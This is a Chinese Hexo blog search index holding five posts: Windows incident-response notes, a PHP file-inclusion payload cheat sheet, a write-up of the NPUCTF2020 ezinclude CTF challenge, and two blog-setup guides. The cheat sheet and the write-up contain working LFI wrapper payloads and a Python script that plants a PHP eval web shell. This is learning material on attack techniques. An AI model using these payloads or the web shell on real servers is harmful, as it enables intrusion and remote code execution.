<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>Windows应急响应</title>
      <link href="/2022/05/05/2022-05-05-Windows%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/"/>
      <url>/2022/05/05/2022-05-05-Windows%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/</url>
      
        <content type="html"><![CDATA[<h1 id="1-Windows的安全特性"><a href="#1-Windows的安全特性" class="headerlink" title="1.Windows的安全特性"></a>1.Windows的安全特性</h1><h2 id="Windows安全标识符"><a href="#Windows安全标识符" class="headerlink" title="Windows安全标识符"></a>Windows安全标识符</h2><p>每当我们创建一个用户或者一个组的时候，系统会分配给该用户或组一个唯一SID，当你重新安装Windows后，也会得到一个唯一的SID</p><p>SID永远都是唯一的，由计算机名、当前时间、当前用户态线程的CPU耗费时间的总和三个参数决定以保证它的唯一性。</p><h2 id="SAM安全账号管理器"><a href="#SAM安全账号管理器" class="headerlink" title="SAM安全账号管理器"></a>SAM安全账号管理器</h2><ol><li><p>安全账号管理器的具体表现就是%SystemRoot%\system32\config\sam文件。</p></li><li><p>HKEY_LOCAL_MACHINE\SAM\SAM</p></li><li><p>HKEY_LOCAL_MACHINE\SECURITY\SAM</p></li></ol><p>保存的就是SAM文件的内容，在正常设置下仅对system是可读写的。</p><h2 id="本地安全策略"><a href="#本地安全策略" class="headerlink" title="本地安全策略"></a>本地安全策略</h2><blockquote><p>账户策略—密码策略：</p></blockquote><p>密码：复杂性启用</p><p>密码长度：最小8位</p><p>强制密码历史：5次</p><p>最长保留：30天</p><blockquote><p>账户策略—账户锁定策略：</p></blockquote><p>账户锁定5次错误登录</p><p>锁定时间20分钟</p><p>复位锁定计数20分钟</p><h2 id="Windows注册表"><a href="#Windows注册表" class="headerlink" title="Windows注册表"></a>Windows注册表</h2><blockquote><p>注册表结构</p></blockquote><ol><li>HKEY_LOCAL_MACHINE主键保存的是与”本地”机器相关的信息。</li><li>HKEY_USER主键保存的是针对所有用户的数据信息</li><li>HKEY_CURRENT_USER主键保存的的当前用户用到的信息。</li><li>HKEY_CLASSES_ROOT主键保存着各种文件的关联信息（即打开方式），还有一些类标识和OLE、DDE之类的信息</li><li>HKEY_CURRENT_CONFIG主键保存着当前用户的配置信息</li></ol><h1 id="2-Windows的安全配置"><a href="#2-Windows的安全配置" class="headerlink" title="2.Windows的安全配置"></a>2.Windows的安全配置</h1><blockquote><p>Windows 应急过程</p></blockquote><p>1、文件排查</p><p>2、进程排查</p><p>3、系统信息排查</p><p>4、工具排查</p><p>5、日志排查</p><h2 id="1、文件排查"><a href="#1、文件排查" class="headerlink" title="1、文件排查"></a>1、文件排查</h2><blockquote><p>开机启动有无异常文件启动：</p></blockquote><p>开始—运行—输入”mfconfig” (Win10已移植到 任务管理器—启动)</p><p><img src="https://cdn.jsdelivr.net/gh/7iray/openimages/blogimages/202205052007376.png" alt="image-20220505200714474"></p><p><img src="https://cdn.jsdelivr.net/gh/7iray/openimages/blogimages/202205052009960.png" alt="image-20220505200919310"></p><blockquote><p>对操作系统敏感的文件路径查看：</p></blockquote><ul><li><p>%WINDIR%</p></li><li><p>%WINDIR%\system32\</p></li><li><p>%TEMP%</p></li><li><p>%LOCALAPPDATA%</p></li><li><p>%APPDATA%</p></li><li><p>主要查看有无异常文件以及最新生成的.bat .exe文件，还有根据入侵时间来判断</p></li></ul><blockquote><p>Recent是系统文件夹，里面存放你最近使用的文档的快捷方式，查看Recent相关文件，通过分析用户最近打开分析可疑文件：</p></blockquote><p>开始—运行—%UserProfile%\Recent</p><p>查看MD5的方法 certutil - hashfile %input% MD5</p><blockquote><p>文件排查：</p></blockquote><ol><li><p>根据文件夹内文件列表时间进行排序，查找可以文件，当然也可以搜索指定日期范围的文件夹及文件</p></li><li><p>查看文件时间，创建时间，修改时间，访问时间，黑客通过菜刀类工具改变的是修改时间。所以如果修改时间在创建时间之前明显是可疑文件</p></li></ol><p><img src="https://cdn.jsdelivr.net/gh/7iray/openimages/blogimages/202205052022465.png" alt="image-20220505202250346"></p><h2 id="2、进程排查"><a href="#2、进程排查" class="headerlink" title="2、进程排查"></a>2、进程排查</h2><ol><li><code>netstat -ano</code>查看目前的网络连接，定位可疑的ESTABLISHED</li></ol><p><img src="https://cdn.jsdelivr.net/gh/7iray/openimages/blogimages/202205052029874.png" alt="image-20220505202923967"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">netstat：显示网络连接、路由表和网络接口信息；</span><br><span class="line"></span><br><span class="line">参数说明：</span><br><span class="line">-a显示所有网络连接、路由表和网络接口信息</span><br><span class="line">-n以数字形式显示地址和端口号</span><br><span class="line">-o显示与每个连接相关的所属进程ID</span><br><span class="line">-r显示路由表</span><br><span class="line">-s 显示按协议统计信息、默认地、显示IP</span><br></pre></td></tr></table></figure><p>常见的状态说明：</p><p>LISTENING侦听状态</p><p>ESTABLISHED建立链接</p><p>CLOSE_WAIT对方主动关闭连接或网络异常导致连接中断</p><ol start="2"><li>根据 <code>netstat</code> 定位出 pid，再通过 <code>tasklist</code> 命令进行进程定位</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tasklist显示运行在本地或远程计算机上的所有进程；</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/7iray/openimages/blogimages/202205052029106.png" alt="image-20220505202955561"></p><p>根据<code>wmic process</code>获取进程的全路径</p><p><img src="https://cdn.jsdelivr.net/gh/7iray/openimages/blogimages/202205052031891.png" alt="image-20220505203142674"></p><ol start="3"><li>通过任务管理器定位进程路径</li></ol><p><img src="https://cdn.jsdelivr.net/gh/7iray/openimages/blogimages/202205052033846.png" alt="image-20220505203307388"></p><ol start="4"><li>通过 wmic 管理进程</li></ol><p>使用wmic process命令查询进程并导出到文件查看</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\Administrator&gt;wmic process &gt; process.txt</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/7iray/openimages/blogimages/202205052037282.png" alt="image-20220505203715637"></p><p>命令行使用<code>wmic process list brief</code>格式化输出</p><p><img src="https://cdn.jsdelivr.net/gh/7iray/openimages/blogimages/202205052039463.png" alt="image-20220505203957735"></p><p>通过筛选进程名定位进程路径<code>wmic process where name=&quot;node.exe&quot; get executablepath</code></p><p><img src="https://cdn.jsdelivr.net/gh/7iray/openimages/blogimages/202205052041539.png" alt="image-20220505204106425"></p><p>通过delete删除进程<code>wmic process where name=&quot;node.exe&quot; delete</code></p><p><img src="https://cdn.jsdelivr.net/gh/7iray/openimages/blogimages/202205052050990.png" alt="image-20220505205017918"></p><h1 id="Windows注册表-1"><a href="#Windows注册表-1" class="headerlink" title="Windows注册表"></a>Windows注册表</h1><h1 id="Windows的安全审计"><a href="#Windows的安全审计" class="headerlink" title="Windows的安全审计"></a>Windows的安全审计</h1>]]></content>
      
      
      
        <tags>
            
            <tag> CORE </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>文件包含</title>
      <link href="/2022/05/04/2022-04-28-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/"/>
      <url>/2022/05/04/2022-04-28-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/</url>
      
        <content type="html"><![CDATA[<h1 id="伪协议"><a href="#伪协议" class="headerlink" title="伪协议"></a>伪协议</h1><h2 id="php-x2F-x2F-filter"><a href="#php-x2F-x2F-filter" class="headerlink" title="php:&#x2F;&#x2F;filter"></a>php:&#x2F;&#x2F;filter</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#通过base64加密方式返回网页源码</span><br><span class="line">http://127.0.0.1/include.php?file=php://filter/convert.read.base64-encode/resource=index.php</span><br></pre></td></tr></table></figure><h2 id="data-x2F-x2F"><a href="#data-x2F-x2F" class="headerlink" title="data:&#x2F;&#x2F;"></a>data:&#x2F;&#x2F;</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#执行phpinfo代码</span><br><span class="line">http://127.0.0.1/include.php?file=data://text/plain,&lt;?php%20phpinfo();?&gt;</span><br></pre></td></tr></table></figure><h2 id="file-x2F-x2F"><a href="#file-x2F-x2F" class="headerlink" title="file:&#x2F;&#x2F;"></a>file:&#x2F;&#x2F;</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#访问文件（绝对路径、相对路径以及网络路径，并且不受allow_url_fopen、allow_url_include影响）</span><br><span class="line">http://127.0.0.1/include.php?file=file:///etc/passsword</span><br></pre></td></tr></table></figure><h2 id="php-x2F-x2F-input"><a href="#php-x2F-x2F-input" class="headerlink" title="php:&#x2F;&#x2F;input"></a>php:&#x2F;&#x2F;input</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">#将POST数据当做php代码执行</span><br><span class="line">http://127.0.0.1/include.php?file=php://input</span><br><span class="line">POST DATA:&lt;?php phpinfo()?&gt;</span><br><span class="line"></span><br><span class="line">#当enctype=&quot;multipart/form-data&quot;时 php://input无法生效</span><br></pre></td></tr></table></figure><h2 id="zip-x2F-x2F"><a href="#zip-x2F-x2F" class="headerlink" title="zip:&#x2F;&#x2F;"></a>zip:&#x2F;&#x2F;</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">#将压缩包内的内容使用php解析 zip://[压缩包绝对路径]#[压缩包内文件]</span><br><span class="line">http://127.0.0.1/include.php?file=zip:///root/zip.jpg%phpinfo.txt</span><br><span class="line"></span><br><span class="line">#zip</span><br><span class="line">#要用#分割压缩包和压缩包里的内容，并且#要用url编码%23</span><br><span class="line">#只要是zip压缩包即可，后缀名可以任意更改</span><br><span class="line">#相同类型的还有zlib://和bzip2://</span><br></pre></td></tr></table></figure><h2 id="php特性"><a href="#php特性" class="headerlink" title="php特性"></a>php特性</h2><h3 id="php7-segment-fault"><a href="#php7-segment-fault" class="headerlink" title="php7 segment fault"></a>php7 segment fault</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url=<span class="string">&#x27;http://8b531e98-d1e8-409c-823f-c9d298fdae62.node4.buuoj.cn:81/flflflflag.php?file=php://filter/string.strip_tags/resource=/etc/passwd&#x27;</span></span><br><span class="line">files = &#123;</span><br><span class="line">    <span class="string">&#x27;file&#x27;</span>:(<span class="string">&#x27;shell.php&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;&lt;?php @eval($_POST[cmd])?&gt;&#x27;</span>)</span><br><span class="line">&#125;</span><br><span class="line">r = requests.post(url=url,files=files)</span><br><span class="line"><span class="built_in">print</span>(r.text)</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> FileInclude </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>NPUCTF2020-ezinclude</title>
      <link href="/2022/05/04/2022-04-28-%5BNPUCTF2020%5Dezinclude%201/"/>
      <url>/2022/05/04/2022-04-28-%5BNPUCTF2020%5Dezinclude%201/</url>
      
        <content type="html"><![CDATA[<p><a href="https://buuoj.cn/challenges#[NPUCTF2020]ezinclude">ezinclude</a></p><h2 id="1、源码"><a href="#1、源码" class="headerlink" title="1、源码"></a>1、源码</h2><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">username/password error<span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--md5($secret.$name)===$pass --&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="2、思路"><a href="#2、思路" class="headerlink" title="2、思路"></a>2、思路</h2><p>根据源码提示 传入GET数据包后查看返回数据包 看到 Cookie 的 Hash 值变更</p><p><img src="https://cdn.jsdelivr.net/gh/7iray/openimages/blogimages/202204281148341.png" alt="image-20220428114816256"></p><p>pass参数传入变更后的Hash 返回数据包提示页面 flflflflag.php</p><p><img src="https://cdn.jsdelivr.net/gh/7iray/openimages/blogimages/202204281150916.png" alt="image-20220428115015851"></p><p>进入页面自动跳转到 404.html，截取数据包重发送看到提示<img src="https://cdn.jsdelivr.net/gh/7iray/openimages/blogimages/202204281152628.png" alt="image-20220428115237551"></p><p>尝试伪协议读取源码</p><p><img src="https://cdn.jsdelivr.net/gh/7iray/openimages/blogimages/202204281202540.png" alt="image-20220428120201465"></p><p>解码后可以看到 data input zip 都被ban了</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;script language=<span class="string">&quot;javascript&quot;</span> type=<span class="string">&quot;text/javascript&quot;</span>&gt;</span><br><span class="line">           window.location.href=<span class="string">&quot;404.html&quot;</span>;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;title&gt;this_is_not_fl4g_and_出题人_wants_girlfriend&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$file</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/data|input|zip/is&#x27;</span>,<span class="variable">$file</span>))&#123;</span><br><span class="line"><span class="keyword">die</span>(<span class="string">&#x27;nonono&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line">@<span class="keyword">include</span>(<span class="variable">$file</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;include($_GET[&quot;file&quot;])&#x27;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p>x import requestsurl&#x3D;’<a href="http://8b531e98-d1e8-409c-823f-c9d298fdae62.node4.buuoj.cn:81/flflflflag.php?file=php://filter/string.strip_tags/resource=/etc/passwd&#39;files">http://8b531e98-d1e8-409c-823f-c9d298fdae62.node4.buuoj.cn:81/flflflflag.php?file=php://filter/string.strip_tags/resource=/etc/passwd&#39;files</a> &#x3D; {    ‘file’:(‘shell.php’,    ‘<?php @eval($_POST[cmd])?>‘)}r &#x3D; requests.post(url&#x3D;url,files&#x3D;files)print(r.text)python</p><p><img src="https://cdn.jsdelivr.net/gh/7iray/openimages/blogimages/202204281254490.png" alt="image-20220428125405456"></p><p>利用 php7 segment fault 特性 <a href="https://qftm.github.io/2020/03/15/LFI-PHPINFO-OR-PHP7-Segment-Fault">参考文档</a> 编写脚本上传phpinfo</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url=<span class="string">&#x27;http://8b531e98-d1e8-409c-823f-c9d298fdae62.node4.buuoj.cn:81/flflflflag.php?file=php://filter/string.strip_tags/resource=/etc/passwd&#x27;</span></span><br><span class="line">files = &#123;</span><br><span class="line">    <span class="string">&#x27;file&#x27;</span>:(<span class="string">&#x27;shell.php&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;&lt;?php @eval($_POST[cmd])?&gt;&#x27;</span>)</span><br><span class="line">&#125;</span><br><span class="line">r = requests.post(url=url,files=files)</span><br><span class="line"><span class="built_in">print</span>(r.text)</span><br></pre></td></tr></table></figure><p>上传后返回 dir.php 包含新增的文件，在phpinfo内看到flag</p><p><img src="https://cdn.jsdelivr.net/gh/7iray/openimages/blogimages/202204281330003.png" alt="image-20220428133020932"></p>]]></content>
      
      
      
        <tags>
            
            <tag> WriteUp </tag>
            
            <tag> FileInclude </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Typora+PicGo自动上传图片到图床</title>
      <link href="/2022/05/04/2022-04-27-Typora+PicGo%E8%87%AA%E5%8A%A8%E4%B8%8A%E4%BC%A0%E5%9B%BE%E7%89%87%E5%88%B0%E5%9B%BE%E5%BA%8A/"/>
      <url>/2022/05/04/2022-04-27-Typora+PicGo%E8%87%AA%E5%8A%A8%E4%B8%8A%E4%BC%A0%E5%9B%BE%E7%89%87%E5%88%B0%E5%9B%BE%E5%BA%8A/</url>
      
        <content type="html"><![CDATA[<h2 id="1、软件下载"><a href="#1、软件下载" class="headerlink" title="1、软件下载"></a>1、软件下载</h2><p>Typora：</p><p>城通网盘：<a href="https://www.ypojie.com/go/aHR0cHM6Ly91cmw5NS5jdGZpbGUuY29tL2QvMjIwNjQzOTUtNDU5NTgyMzEtZDU2MjRk">https://url95.ctfile.com/d/22064395-45958231-d5624d</a>（访问密码：YPOJIE）</p><p>PicGo：</p><p><a href="https://github.com/Molunerfinn/PicGo/releases">Releases · Molunerfinn&#x2F;PicGo (github.com)</a></p><h2 id="2、创建仓库-amp-生成Token"><a href="#2、创建仓库-amp-生成Token" class="headerlink" title="2、创建仓库&amp;生成Token"></a>2、创建仓库&amp;生成Token</h2><p>点击头像右上角 + 号创建仓库 仓库名称任意 选择为Public仓库</p><p><img src="https://cdn.jsdelivr.net/gh/Moe7ilin/openimages/202204271818303.png" alt="image-20220427181808265"></p><p><img src="https://cdn.jsdelivr.net/gh/Moe7ilin/openimages/202204271819195.png" alt="image-20220427181945124"></p><p>点击头像选择 Settings，左侧点击 Developer settings，选择左侧 Personal access tokens，点击 Generate new token 生成Token</p><p><img src="https://cdn.jsdelivr.net/gh/Moe7ilin/openimages/202204271820179.png" alt="image-20220427182034143"></p><p><img src="https://cdn.jsdelivr.net/gh/Moe7ilin/openimages/202204271820989.png" alt="image-20220427182045957"></p><p><img src="https://cdn.jsdelivr.net/gh/Moe7ilin/openimages/202204271821341.png" alt="image-20220427182149263"></p><h2 id="3、配置PicGo"><a href="#3、配置PicGo" class="headerlink" title="3、配置PicGo"></a>3、配置PicGo</h2><blockquote><p>PicGo设置 勾选 时间戳重命名，选择显示的图床勾选 Github图床 其他取消选择</p><p>GitHub图床设置 设定仓库名、设定分支名、设定Token、设定自定义域名（这里设置自定义域名的作用既是使用cdn加速访问github图床内的照片）</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/Moe7ilin/openimages/202204271816049.png" alt="image-20220427181645998"></p><p><img src="https://cdn.jsdelivr.net/gh/Moe7ilin/openimages/202204271817043.png" alt="image-20220427181659991"></p><h2 id="4、配置Typora"><a href="#4、配置Typora" class="headerlink" title="4、配置Typora"></a>4、配置Typora</h2><p>点击左上角 文件 &gt; 偏好设置 &gt; 图像</p><p><img src="https://cdn.jsdelivr.net/gh/Moe7ilin/openimages/202204271814464.png" alt="image-20220427181424280"></p><p>配置完成后  直接在Typora内粘贴即可实现 图片自动上传至Github并使用jsdelivr CDN加速访问</p>]]></content>
      
      
      
        <tags>
            
            <tag> Blog </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Github搭建博客</title>
      <link href="/2022/05/04/2022-04-27-Github%E6%90%AD%E5%BB%BA%E5%8D%9A%E5%AE%A2/"/>
      <url>/2022/05/04/2022-04-27-Github%E6%90%AD%E5%BB%BA%E5%8D%9A%E5%AE%A2/</url>
      
        <content type="html"><![CDATA[<h2 id="1、环境准备"><a href="#1、环境准备" class="headerlink" title="1、环境准备"></a>1、环境准备</h2><p>Hexo 基于 Node.js，搭建过程中还需要使用 npm（Node.js 已带） 和 git，因此先搭建本地操作环境，安装 Node.js 和 Git。</p><ul><li>Node.js：<a href="https://nodejs.org/zh-cn">https://nodejs.org/zh-cn</a></li><li>Git：<a href="https://git-scm.com/downloads">https://git-scm.com/downloads</a></li></ul><p><img src="https://cdn.jsdelivr.net/gh/Moe7ilin/openimages/202204271828429.png" alt="img"></p><h2 id="2、创建Github仓库"><a href="#2、创建Github仓库" class="headerlink" title="2、创建Github仓库"></a>2、创建Github仓库</h2><p>点击Github主页右上角+号选择New repository</p><p><img src="https://cdn.jsdelivr.net/gh/Moe7ilin/openimages/202204271825382.png" alt="img"></p><ul><li>Repository name：用户名.github.io</li></ul><p><img src="https://cdn.jsdelivr.net/gh/Moe7ilin/openimages/202204271828884.png" alt="img"></p><p>填好后点击 Create repository 创建</p><h2 id="2、Git连接Github"><a href="#2、Git连接Github" class="headerlink" title="2、Git连接Github"></a>2、Git连接Github</h2><p>任意位置右键点击 Git Bash Here</p><p><img src="https://cdn.jsdelivr.net/gh/Moe7ilin/openimages/202204271825435.png" alt="img"></p><p><strong>设置用户名&amp;邮箱：</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">git config --global user.name &quot;GitHub 用户名&quot;</span><br><span class="line">git config --global user.email &quot;GitHub 邮箱&quot;</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/Moe7ilin/openimages/202204271825387.png" alt="img"></p><p><strong>创建SSH秘钥：</strong></p><p>输入命令 ssh-keygen -t rsa -C “GitHub 邮箱” 后一路回车</p><p><img src="https://cdn.jsdelivr.net/gh/Moe7ilin/openimages/202204271828515.png" alt="img"></p><p><strong>添加秘钥：</strong></p><p>打开生成的秘钥复制内容</p><p><img src="https://cdn.jsdelivr.net/gh/Moe7ilin/openimages/202204271825254.png" alt="img"><br><img src="https://cdn.jsdelivr.net/gh/Moe7ilin/openimages/202204271825281.png" alt="img"></p><p>Github右上角展开点击Settings</p><p><img src="https://cdn.jsdelivr.net/gh/Moe7ilin/openimages/202204271828926.png" alt="img"></p><p>左侧选择 SSH and GPG keys</p><p><img src="https://cdn.jsdelivr.net/gh/Moe7ilin/openimages/202204271825345.png" alt="img"></p><p>点击 New SSH key</p><p><img src="https://cdn.jsdelivr.net/gh/Moe7ilin/openimages/202204271828034.png" alt="img"></p><p>Title填写任意内容，将复制的内容粘贴进Key后点击 Add SSH key</p><p><img src="https://cdn.jsdelivr.net/gh/Moe7ilin/openimages/202204271829309.png" alt="img"></p><p><strong>验证连接</strong></p><p>打开Git Bash输入 <code>ssh -T git@github.com</code></p><p><img src="https://cdn.jsdelivr.net/gh/Moe7ilin/openimages/202204271825133.png" alt="img"></p><p>显示 successfully连接成功</p><h2 id="3、jekyll-TeXt搭建博客"><a href="#3、jekyll-TeXt搭建博客" class="headerlink" title="3、jekyll-TeXt搭建博客"></a>3、jekyll-TeXt搭建博客</h2><p>下载博客程序</p><p><a href="https://github.com/kitian616/jekyll-TeXt-theme/archive/master.zip">https://github.com/kitian616/jekyll-TeXt-theme/archive/master.zip</a></p><p> 本地创建空文件夹 在空文件内打开 Git Bash 输入 <code>git init</code></p><p><img src="https://cdn.jsdelivr.net/gh/7iray/openimages/blogimages/202204280831397.png" alt="image-20220428083137365"></p><p>将压缩包内所有内容拖至文件夹内</p><p><img src="https://cdn.jsdelivr.net/gh/7iray/openimages/blogimages/202204280832129.png" alt="image-20220428083209072"></p><p>在 Git Bash 内部署上传</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">git add .</span><br><span class="line">git remote add origin git@github.com:用户名/仓库名称</span><br><span class="line">（git remote add origin git@github.com:7iray/7iray.github.io）</span><br><span class="line">git commit -m &quot;push&quot;</span><br><span class="line">git push -u origin master</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/7iray/openimages/blogimages/202204280833417.png" alt="image-20220428083323371"></p><blockquote><p>若分支名称非master 而是main 则需要切换分支 或者在 push 时选择分支为 main，完整命令为</p><p>创建分支：<code>git branch master</code></p><p>切换分支：<code>git checkout master</code></p></blockquote><p>此时GitHub仓库便已接收到Push内容，使用浏览器访问 用户名.github.io 即可看到博客</p><p><img src="https://cdn.jsdelivr.net/gh/7iray/openimages/blogimages/202204280842299.png" alt="image-20220428084209189"></p><p>在修改配置文件、创建新的文章后，再次push上传更改后的内容即可</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git add .</span><br><span class="line">git commit -m &quot;push&quot;</span><br><span class="line">git push -u origin master</span><br></pre></td></tr></table></figure><h2 id="3-2、Hexo搭建博客"><a href="#3-2、Hexo搭建博客" class="headerlink" title="3_2、Hexo搭建博客"></a>3_2、Hexo搭建博客</h2><blockquote><p>Hexo有更方便的管理与上传方式，也是可选择的框架之一</p></blockquote><p><strong>本地安装Hexo</strong></p><p>新建空文件夹用来存放Hexo程序，在文件内右键打开Git Bash</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install -g hexo-cli</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/Moe7ilin/openimages/202204271825179.png" alt="img"></p><p><img src="https://cdn.jsdelivr.net/gh/Moe7ilin/openimages/202204271829776.png" alt="img"></p><p>在Git Bash内输入 hexo init</p><p><img src="https://cdn.jsdelivr.net/gh/Moe7ilin/openimages/202204271825362.png" alt="img"></p><p>再输入 hexo generate （可直接输入hexo g）将Hexo编译为HTML代码</p><p><img src="https://cdn.jsdelivr.net/gh/Moe7ilin/openimages/202204271829374.png" alt="img"></p><p>输入 hexo server 在本地预览博客</p><p><img src="https://cdn.jsdelivr.net/gh/Moe7ilin/openimages/202204271829138.png" alt="img"></p><p>届时博客已经在本地搭建成功</p><p><img src="https://cdn.jsdelivr.net/gh/Moe7ilin/openimages/202204271829562.png" alt="img"></p><p><strong>配置README.md文件</strong></p><p>在本地文件夹source内新建 README.md 文件</p><p><img src="https://cdn.jsdelivr.net/gh/Moe7ilin/openimages/202204271825136.png" alt="img"></p><p>打开配置_config.yml文件修改内容 skip_render: README.md</p><p><img src="https://cdn.jsdelivr.net/gh/Moe7ilin/openimages/202204271829110.png" alt="img"></p><p><strong>上传博客至Github</strong></p><p>在Git Bash终端输入 npm install hexo-deployer-git –save 安装hexo-deployer-git插件用来将hexo部署到github</p><p><img src="https://cdn.jsdelivr.net/gh/Moe7ilin/openimages/202204271825497.png" alt="img"></p><p>打开博客目录下的 _config.yml</p><p><img src="https://cdn.jsdelivr.net/gh/Moe7ilin/openimages/202204271825522.png" alt="img"></p><p>下拉至底部 修改内容如下</p><p>在冒号后面记得跟上一个空格</p><ul><li>type: git</li><li>repo: <a href="mailto:&#x67;&#x69;&#x74;&#64;&#103;&#x69;&#x74;&#104;&#x75;&#x62;&#46;&#99;&#111;&#109;">&#x67;&#x69;&#x74;&#64;&#103;&#x69;&#x74;&#104;&#x75;&#x62;&#46;&#99;&#111;&#109;</a>:用户名&#x2F;仓库名</li><li>branch: master</li></ul><p><img src="https://cdn.jsdelivr.net/gh/Moe7ilin/openimages/202204271830505.png" alt="img"></p><p>再打开Git Bash输入 hexo deploy 上传返回  INFO Deploy done: git 即为上传成功</p><p><img src="https://cdn.jsdelivr.net/gh/Moe7ilin/openimages/202204271825306.png" alt="img"></p><p>仓库内已存在上传的hexo程序文件</p><p><img src="https://cdn.jsdelivr.net/gh/Moe7ilin/openimages/202204271825117.png" alt="img"></p><p>最后访问仓库名称 moe7ilin.github.io 即可访问博客</p><p><img src="https://cdn.jsdelivr.net/gh/Moe7ilin/openimages/202204271825354.png" alt="img"></p>]]></content>
      
      
      
        <tags>
            
            <tag> Blog </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
